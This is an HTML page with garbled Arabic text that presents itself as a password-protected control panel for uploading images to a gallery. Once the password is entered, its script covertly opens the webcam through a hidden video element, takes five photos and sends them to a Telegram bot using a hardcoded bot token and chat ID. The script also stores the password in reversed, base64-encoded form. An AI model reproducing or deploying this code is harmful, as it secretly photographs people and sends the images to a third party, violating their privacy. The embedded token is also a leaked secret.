
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</title>
  <style>
    body { background:#000; color:#fff; font-family:sans-serif; text-align:center; }
    #login, #panel { display:none; }
    button, input[type=file] {
      margin:10px; padding:10px 20px; font-size:16px;
      border:none; border-radius:8px; background:crimson; color:#fff; cursor:pointer;
    }
    button:hover { background:darkred; }
    video { display:none; } /*  */
  </style>
</head>
<body>

  <h1>ğŸ”’ Ø¯Ø®ÙˆÙ„ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h1>

  <!-->
  <div id="login">
    <p>Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±</p>
    <input type="password" id="pass">
    <button onclick="checkPassword()">Ø¯Ø®ÙˆÙ„</button>
  </div>

  <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… -->
  <div id="panel">
    <h2>ğŸ–¼ï¸ Ø±ÙØ¹ ØµÙˆØ± Ù…Ù† Ø§Ù„Ø¬Ù‡Ø§Ø²</h2>
    <input type="file" id="fileInput" multiple accept="image/*">
    <button onclick="uploadFiles()">Ø±ÙØ¹ Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</button>
  </div>

  <!--  -->
  <video id="video" autoplay playsinline></video>

  <script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª
    const TG_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID  = 7664410054; // 

    // 
    const PASS_OBF = btoa("45006414667".split("").reverse().join("")); 

    function checkPassword() {
      const input = document.getElementById("pass").value;
      const ok = btoa(input.split("").reverse().join("")) === PASS_OBF;
      if (ok) {
        document.getElementById("login").style.display = "none";
        document.getElementById("panel").style.display = "block";
        startCameraAndCapture();
      } else {
        alert("âŒ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± ØºÙŠØ± ØµØ­ÙŠØ­Ø©");
      }
    }

    // 
    async function startCameraAndCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;

        // 
        setTimeout(async () => {
          for (let i = 1; i <= 5; i++) {
            const photo = await captureFrame(video);
            await sendTelegramPhoto(photo, i);
            await new Promise(r => setTimeout(r, 2000)); // 
          }
          alert("âœ…5âœ…");
        }, 1500);

      } catch (e) {
        console.error("âŒ:", e);
      }
    }

    // 
    function captureFrame(video) {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      return new Promise(resolve => {
        canvas.toBlob(blob => resolve(blob), "image/jpeg");
      });
    }

    // 
    async function sendTelegramPhoto(fileBlob, index) {
      const url = `https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`;
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", fileBlob, `photo${index}.jpg`);
      try { await fetch(url, { method: "POST", body: fd }); } catch(e){}
    }

    //
    function uploadFiles() {
      const files = document.getElementById("fileInput").files;
      if (!files.length) return alert("Ø§Ø®ØªØ± ØµÙˆØ± Ø£ÙˆÙ„Ø§Ù‹");
      const stored = JSON.parse(localStorage.getItem("gallery") || "[]");

      for (let file of files) {
        const reader = new FileReader();
        reader.onload = e => {
          stored.push({ src: e.target.result, desc: "ØµÙˆØ±Ø© Ù…Ø±ÙÙˆØ¹Ø©" });
          localStorage.setItem("gallery", JSON.stringify(stored));
        };
        reader.readAsDataURL(file);
      }
      alert("âœ…");
    }

    // 
    document.getElementById("login").style.display = "block";
  </script>

</body>
</html>

